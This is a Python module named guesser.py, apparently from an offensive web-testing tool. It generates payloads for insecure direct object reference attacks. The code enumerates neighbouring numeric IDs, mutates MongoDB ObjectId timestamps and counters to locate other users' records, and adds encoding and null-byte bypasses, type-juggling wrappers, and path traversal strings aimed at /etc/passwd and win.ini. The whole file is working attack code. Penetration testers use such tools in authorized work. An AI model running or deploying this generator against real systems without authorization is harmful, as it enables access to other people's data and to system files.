#!/usr/bin/env python3
"""
Module: guesser.py
Purpose: Generate intelligent, context-aware, high-signal IDOR payloads.
"""
import uuid
import base64
import time
from typing import List, Optional, Set
from pathlib import Path
from urllib.parse import quote, quote_plus
from core import logger

# Payload directory relative to project root
PAYLOAD_DIR = Path(__file__).resolve().parents[1] / "payloads"

COMMON_PAYLOADS = {
    "admin_like": ["admin", "root", "administrator", "superuser", "owner", "test", "guest", "demo"],
    "traversal": ["../etc/passwd", "..\\Windows\\win.ini", "%2e%2e/%2e%2e/"],
    "generic_numeric": [str(i) for i in range(1, 21)] + ["0", "-1", "999", "1000", "1337", "31337"],
}

def load_payloads_from_file(filename: str) -> Set[str]:
    """Safely load a payload file."""
    path = PAYLOAD_DIR / filename
    if not path.exists():
        return set()
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
        return {line.strip() for line in lines if line.strip() and not line.startswith("#")}
    except Exception:
        return set()

def is_uuid(value: str) -> bool:
    try:
        uuid.UUID(value)
        return True
    except ValueError:
        return False

def is_mongodb_objectid(value: str) -> bool:
    """Check for 24-char hex string (MongoDB ID)."""
    if len(value) != 24:
        return False
    try:
        int(value, 16)
        return True
    except ValueError:
        return False

def generate_numeric_variations(original: int) -> Set[str]:
    """Smart proximity and boundary testing."""
    payloads = set()
    # Nearby values (The classic IDOR)
    for offset in range(-20, 21):
        if offset == 0: continue
        candidate = original + offset
        if candidate >= 0:
            payloads.add(str(candidate))
    
    # Common boundaries
    payloads.update(["0", "1", "100", "1000", "999999", "2147483647"])
    return payloads

def generate_mongodb_variations(original: str) -> Set[str]:
    """
    MongoDB ObjectId Hacking.
    Structure: 4-byte timestamp + 5-byte random + 3-byte counter.
    Strategy: We slightly modify the timestamp and the counter to find users created near us.
    """
    payloads = set()
    try:
        # Increment/Decrement the last 6 chars (Counter)
        # This finds users created in the exact same second/process
        prefix = original[:18]
        suffix_int = int(original[18:], 16)
        
        for i in range(-50, 51):
            if i == 0: continue
            new_suffix = hex(suffix_int + i)[2:].zfill(6)
            payloads.add(prefix + new_suffix)

        # Increment/Decrement the Timestamp (first 8 chars)
        # This finds users created seconds before/after us
        timestamp_int = int(original[:8], 16)
        suffix = original[8:]
        for i in range(-10, 11):
            if i == 0: continue
            new_time = hex(timestamp_int + i)[2:].zfill(8)
            payloads.add(new_time + suffix)
            
    except Exception:
        pass
    return payloads

def generate_uuid_variations() -> Set[str]:
    """Static UUID guesses (Low probability of success)."""
    return {
        "00000000-0000-0000-0000-000000000000",
        "11111111-1111-1111-1111-111111111111",
        str(uuid.UUID(int=1)), 
    }

def generate_encoding_variations(value: str) -> Set[str]:
    """URL encoding and bypasses."""
    return {
        quote(value),
        quote_plus(value),
        quote(quote(value)), # Double URL encode
        f"{value}%00",       # Null byte injection
    }

def generate_type_juggling_variations(value: str) -> Set[str]:
    """
    Loose comparison and parser confusion.
    Corrected JSON syntax!
    """
    return {
        f"{value}[]",           # PHP/Rails array confusion
        f"[{value}]",           # JSON array wrapper
        f'{{"id":"{value}"}}',  # JSON object wrapper (Fixed quotes!)
        f'{{"id":{value}}}',    # JSON int wrapper (Only if value is numeric)
        f"{value}.json",        # Extension appending
        f"{value}%20",          # Space padding
    }

def generate_id_payloads(
    original_value: Optional[str] = None,
    max_payloads: Optional[int] = 500
) -> List[str]:
    """Generate high-signal payloads."""
    all_payloads: Set[str] = set()

    # 1. Universal payloads
    for payload_set in COMMON_PAYLOADS.values():
        all_payloads.update(payload_set)

    # 2. Context-Aware Generation
    if original_value:
        orig = original_value.strip()

        # A. Numeric ID
        if orig.isdigit():
            try:
                base_int = int(orig)
                all_payloads.update(generate_numeric_variations(base_int))
                # Add JSON int format for numeric IDs
                all_payloads.add(f'{{"id":{orig}}}') 
            except ValueError:
                pass

        # B. MongoDB ObjectId (New Feature!)
        elif is_mongodb_objectid(orig):
            all_payloads.update(generate_mongodb_variations(orig))

        # C. UUID
        elif is_uuid(orig):
            all_payloads.update(generate_uuid_variations())

        # D. Generic String
        else:
            all_payloads.add(orig.upper())
            all_payloads.add(orig.lower())

        # 3. Bypasses (Applied to everything)
        all_payloads.update(generate_encoding_variations(orig))
        all_payloads.update(generate_type_juggling_variations(orig))

    else:
        # Blind fallback
        all_payloads.update(COMMON_PAYLOADS["generic_numeric"])

    # Cleanup
    if original_value:
        all_payloads.discard(original_value.strip())
    
    # Sort: Shortest -> Numeric -> Alphanumeric
    payload_list = list(all_payloads)
    payload_list.sort(key=lambda x: (len(x), not x.isdigit(), x))

    if max_payloads:
        payload_list = payload_list[:max_payloads]

    logger.debug(f"Generated {len(payload_list)} payloads.")
    return payload_list

if __name__ == "__main__":
    # Test MongoDB
    print("MongoDB:", generate_id_payloads("507f1f77bcf86cd799439011")[:5])
    # Test Numeric
    print("Numeric:", generate_id_payloads("100")[:5])